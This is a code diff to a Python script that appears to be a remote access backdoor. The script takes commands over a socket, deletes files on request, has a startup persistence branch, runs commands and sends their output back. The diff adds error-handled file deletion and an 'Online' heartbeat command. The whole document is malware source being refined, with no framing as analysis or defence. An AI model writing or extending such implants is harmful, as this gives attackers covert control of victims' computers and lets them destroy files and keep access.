@@ -1,7 +1,6 @@
 import socket
 import os
 import shutil
-import subprocess
 
 user = os.getlogin()
 directory = os.getcwd()
@@ -41,7 +40,11 @@ while True:
                 s.sendall("Could not find directory...".encode("utf-8"))
         elif data == "del":
             del_input_data = (s.recv(1024)).decode("utf-8")
-            os.remove(del_input_data)
+            try:
+                os.remove(del_input_data)
+                s.sendall("Removed".encode("utf-8"))
+            except:
+                s.sendall("Failed to remove file".encode("utf-8"))
         elif data == "startup":
             try:
                 if os.path.exists(path):
@@ -57,3 +60,8 @@ while True:
             send = command_data_return.read()
             s.sendall(send.encode("utf-8"))
             command_data_return.close()
+        elif data == "check":
+            try:
+                s.sendall("Online".encode("utf-8"))
+            except:
+                print("Could not send message")
